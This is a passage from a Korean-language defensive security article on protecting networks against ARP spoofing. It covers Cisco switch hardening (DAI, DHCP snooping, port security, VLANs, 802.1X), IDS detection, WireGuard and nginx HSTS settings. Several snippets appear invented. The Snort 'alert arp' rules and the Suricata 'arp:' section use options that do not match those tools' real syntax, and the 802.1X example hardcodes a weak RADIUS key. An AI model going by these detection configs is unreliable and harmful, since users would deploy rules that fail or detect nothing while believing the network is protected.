Switch(config-if)# ip arp inspection trust
Switch(config-if)# exit

! 정적 호스트에 대한 ARP ACL 설정 (DHCP를 사용하지 않는 서버)
Switch(config)# arp access-list STATIC-HOSTS
Switch(config-arp-nacl)# permit ip host 192.168.1.100 mac host 0011.2233.4455
Switch(config-arp-nacl)# permit ip host 192.168.1.101 mac host 0011.2233.4456
Switch(config-arp-nacl)# exit

! ARP ACL을 VLAN에 적용
Switch(config)# ip arp inspection filter STATIC-HOSTS vlan 10

! DAI 검증 옵션 설정 (IP, MAC, 목적지 MAC 검증)
Switch(config)# ip arp inspection validate src-mac dst-mac ip

! DAI 속도 제한 설정 (DoS 공격 방지)
Switch(config)# interface range GigabitEthernet0/2-24
Switch(config-if-range)# ip arp inspection limit rate 15
Switch(config-if-range)# exit

! DAI 로깅 활성화
Switch(config)# ip arp inspection log-buffer entries 1024
Switch(config)# ip arp inspection log-buffer logs 1024 interval 10

! DAI 상태 확인
Switch# show ip arp inspection
Switch# show ip arp inspection interfaces
Switch# show ip arp inspection statistics vlan 10
```

DAI의 주요 장점은 다음과 같다.
- 중앙 집중식 보호: 개별 호스트 설정 없이 네트워크 전체를 보호한다.
- 투명한 운영: 엔드포인트에서는 추가 설정이 필요하지 않다.
- 높은 효과: ARP 스푸핑 공격을 네트워크 진입 시점에서 차단한다.

**DHCP 스누핑 (DHCP Snooping)**

DHCP 스누핑은 스위치가 DHCP 트래픽을 모니터링하여 신뢰할 수 있는 DHCP 서버로부터의 응답만 허용하고, IP-MAC-포트 바인딩 정보를 저장하여 DAI와 IP Source Guard의 기반 데이터베이스로 활용하며, 무단 DHCP 서버(Rogue DHCP Server) 공격도 방어한다.

```cisco
! DHCP 스누핑 전역 활성화
Switch(config)# ip dhcp snooping

! 특정 VLAN에서 DHCP 스누핑 활성화
Switch(config)# ip dhcp snooping vlan 10,20,30

! Option 82 비활성화 (일부 DHCP 서버는 Option 82를 지원하지 않음)
Switch(config)# no ip dhcp snooping information option

! 신뢰할 수 있는 포트 지정 (정상 DHCP 서버 연결 포트)
Switch(config)# interface GigabitEthernet0/1
Switch(config-if)# ip dhcp snooping trust
Switch(config-if)# exit

! 바인딩 데이터베이스를 파일로 저장
Switch(config)# ip dhcp snooping database flash:dhcp-snooping.db

! DHCP 스누핑 상태 확인
Switch# show ip dhcp snooping
Switch# show ip dhcp snooping binding
```

**포트 보안 (Port Security)**

포트 보안은 스위치 포트에 연결할 수 있는 MAC 주소를 제한하여 공격자가 자신의 MAC 주소로 트래픽을 송수신하는 것을 차단하며, 허용되지 않은 MAC 주소가 탐지되면 포트를 자동으로 비활성화(err-disable)하거나 패킷을 드롭할 수 있다.

```cisco
! 엑세스 포트에서 포트 보안 설정
Switch(config)# interface GigabitEthernet0/2
Switch(config-if)# switchport mode access
Switch(config-if)# switchport port-security

! 최대 허용 MAC 주소 개수 설정
Switch(config-if)# switchport port-security maximum 2

! 위반 시 동작 설정 (shutdown: 포트 비활성화, restrict: 패킷 드롭, protect: 조용히 드롭)
Switch(config-if)# switchport port-security violation shutdown

! MAC 주소 학습 방식 (sticky: 동적 학습 후 설정에 저장)
Switch(config-if)# switchport port-security mac-address sticky

! 또는 정적으로 MAC 주소 지정
Switch(config-if)# switchport port-security mac-address 0011.2233.4455
Switch(config-if)# exit

! 포트 보안 상태 확인
Switch# show port-security interface GigabitEthernet0/2
Switch# show port-security address

! err-disable 상태 복구
Switch# configure terminal
Switch(config)# interface GigabitEthernet0/2
Switch(config-if)# shutdown
Switch(config-if)# no shutdown
```

**VLAN 세그먼테이션**

네트워크를 여러 VLAN으로 분할하면 ARP 브로드캐스트 도메인이 제한되어 공격자가 다른 VLAN의 호스트를 공격할 수 없으며, 민감한 서버와 일반 사용자 네트워크를 분리하여 공격 표면을 최소화할 수 있다.

```cisco
! VLAN 생성 및 설정
Switch(config)# vlan 10
Switch(config-vlan)# name USER_NETWORK
Switch(config-vlan)# exit

Switch(config)# vlan 20
Switch(config-vlan)# name SERVER_NETWORK
Switch(config-vlan)# exit

Switch(config)# vlan 30
Switch(config-vlan)# name MANAGEMENT_NETWORK
Switch(config-vlan)# exit

! 포트에 VLAN 할당
Switch(config)# interface range GigabitEthernet0/2-10
Switch(config-if-range)# switchport mode access
Switch(config-if-range)# switchport access vlan 10
Switch(config-if-range)# exit

! VLAN 간 라우팅은 방화벽을 통해서만 허용
! 이를 통해 VLAN 간 트래픽을 제어하고 감사할 수 있음
```

### 계층 3: 탐지 및 모니터링

**침입 탐지/방지 시스템 (IDS/IPS)**

Snort, Suricata, Zeek(구 Bro) 등의 네트워크 IDS/IPS는 ARP 스푸핑 패턴을 탐지하는 시그니처를 포함하고 있으며, 비정상적인 ARP 트래픽 속도, 동일 IP에 대한 여러 MAC 주소, gratuitous ARP 남용 등을 탐지하여 경고하거나 차단할 수 있다.

Snort의 ARP 스푸핑 탐지 규칙 예시:

```snort
# 동일 IP에 대한 서로 다른 MAC 주소 탐지
alert arp any any -> any any (msg:"ARP Spoofing Detected - Multiple MAC for Same IP"; \
    arpspoof; classtype:network-scan; sid:1000001; rev:1;)

# 비정상적으로 높은 ARP 응답 속도
alert arp any any -> any any (msg:"ARP Flood Attack"; \
    threshold: type both, track by_src, count 10, seconds 1; \
    classtype:denial-of-service; sid:1000002; rev:1;)

# Gratuitous ARP 남용 탐지
alert arp any any -> any any (msg:"Excessive Gratuitous ARP"; \
    arp_opcode 2; threshold: type threshold, track by_src, count 5, seconds 10; \
    classtype:network-scan; sid:1000003; rev:1;)
```

Suricata 설정 파일에 ARP 스푸핑 탐지 활성화:

```yaml
# /etc/suricata/suricata.yaml
arp:
  enabled: yes
  detect-anomalies: yes
  # ARP 캐시 테이블 모니터링
  track-arp-cache: yes
  # 동일 IP에 대한 MAC 변경 감지
  detect-ip-change: yes
```

**SIEM 통합 및 상관 분석**

Splunk, ELK Stack(Elasticsearch, Logstash, Kibana), Wazuh 등의 SIEM(Security Information and Event Management) 시스템과 네트워크 보안 장비를 통합하면 ARP 스푸핑과 관련된 다양한 로그(스위치 DAI 로그, IDS 경고, 방화벽 이상 트래픽 등)를 상관 분석하여 공격의 전체적인 맥락을 파악하고 신속하게 대응할 수 있다.

**네트워크 행위 분석 (NBA)**

정상적인 네트워크 트래픽 패턴을 학습하고 이상 징후를 탐지하는 머신러닝 기반 솔루션(Darktrace, Vectra AI 등)은 ARP 스푸핑으로 인한 비정상적인 통신 흐름, 트래픽 경로 변경, 암호화되지 않은 트래픽 증가 등을 자동으로 탐지할 수 있다.

### 계층 4: 트래픽 암호화

**VPN 및 IPsec 터널**

모든 네트워크 트래픽을 VPN 터널을 통해 암호화하면 공격자가 중간자 위치를 확보하더라도 패킷 내용을 읽거나 변조할 수 없으며, OpenVPN, WireGuard, IPsec 등의 VPN 프로토콜을 사용하여 엔드투엔드 암호화를 구현할 수 있다.

WireGuard VPN 설정 예시 (Ubuntu):

```bash
# WireGuard 설치
sudo apt install -y wireguard

# 키 쌍 생성
wg genkey | sudo tee /etc/wireguard/privatekey | wg pubkey | sudo tee /etc/wireguard/publickey

# 서버 설정 파일 생성 (/etc/wireguard/wg0.conf)
sudo tee /etc/wireguard/wg0.conf > /dev/null << EOF
[Interface]
PrivateKey = <SERVER_PRIVATE_KEY>
Address = 10.0.0.1/24
ListenPort = 51820

[Peer]
PublicKey = <CLIENT_PUBLIC_KEY>
AllowedIPs = 10.0.0.2/32
EOF

# VPN 인터페이스 시작
sudo wg-quick up wg0

# 부팅 시 자동 시작
sudo systemctl enable wg-quick@wg0
```

**HTTPS/TLS 강제 적용**

모든 웹 애플리케이션에서 HTTPS를 강제하고 HSTS(HTTP Strict Transport Security) 헤더를 설정하면 SSL 스트리핑 공격을 방어할 수 있으며, Let's Encrypt를 사용하여 무료 TLS 인증서를 발급받을 수 있다.

Nginx에서 HTTPS 강제 및 HSTS 설정:

```nginx
server {
    listen 80;
    server_name example.com;

    # HTTP를 HTTPS로 영구 리다이렉트
    return 301 https://$server_name$request_uri;
}

server {
    listen 443 ssl http2;
    server_name example.com;

    # TLS 인증서 설정
    ssl_certificate /etc/letsencrypt/live/example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;

    # HSTS 헤더 설정 (1년 동안 HTTPS만 사용, 서브도메인 포함)
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;

    # 최신 TLS 버전만 허용
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;
    ssl_prefer_server_ciphers on;
}
```

**802.1X 네트워크 접근 제어**

802.1X는 IEEE 표준 포트 기반 네트워크 접근 제어 프로토콜로, 사용자나 장치가 네트워크에 연결하기 전에 인증을 요구하며, RADIUS 서버와 통합하여 AD(Active Directory) 자격증명이나 디지털 인증서를 통한 강력한 인증을 구현할 수 있고, 인증되지 않은 장치는 네트워크에 접근할 수 없으므로 공격자가 ARP 스푸핑을 시도할 기회 자체가 차단된다.

Cisco 스위치에서 802.1X 설정 예시:

```cisco
! AAA 활성화
Switch(config)# aaa new-model
Switch(config)# aaa authentication dot1x default group radius

! RADIUS 서버 설정
Switch(config)# radius server RADIUS-SERVER
Switch(config-radius-server)# address ipv4 192.168.1.50 auth-port 1812 acct-port 1813
Switch(config-radius-server)# key SecretKey123
Switch(config-radius-server)# exit

! 전역 802.1X 활성화
Switch(config)# dot1x system-auth-control

! 포트별 802.1X 설정
Switch(config)# interface GigabitEthernet0/2
Switch(config-if)# switchport mode access
Switch(config-if)# authentication port-control auto
Switch(config-if)# dot1x pae authenticator
Switch(config-if)# exit
```

## 결론 및 권고사항

ARP 스푸핑은 1980년대에 설계된 ARP 프로토콜의 구조적 한계에 기인한 오래된 공격 기법이지만, 여전히 현대 네트워크 환경에서 심각한 위협으로 남아 있으며, 특히 레거시 네트워크 장비를 사용하거나 보안 설정이 미흡한 환경에서는 공격자가 쉽게 네트워크 트래픽을 가로채고 변조할 수 있다.

네트워크 관리자와 보안 전문가는 ARP 스푸핑의 원리와 위험성을 정확히 이해하고, 엔드포인트 보호(정적 ARP, 모니터링 도구), 네트워크 인프라 보안(DAI, DHCP 스누핑, 포트 보안, VLAN 세그먼테이션), 탐지 및 모니터링(IDS/IPS, SIEM), 트래픽 암호화(VPN, HTTPS, 802.1X) 등 다층 방어 전략을 수립하여 조직의 네트워크 자산을 보호해야 하며, 모든 보안 솔루션은 정기적으로 테스트하고 업데이트하여 신규 공격 기법에 대응할 수 있도록 유지해야 한다.

궁극적으로 ARP 프로토콜의 근본적인 보안 문제를 해결하기 위해서는 인증과 무결성 검증을 포함하는 차세대 프로토콜(예: IPv6 환경의 NDP with SEND)로의 전환이 필요하지만, IPv4 네트워크가 여전히 광범위하게 사용되는 현실에서는 위에서 설명한 방어 기법들을 조합하여 실질적인 보안 수준을 향상시키는 것이 현실적인 접근 방법이다.
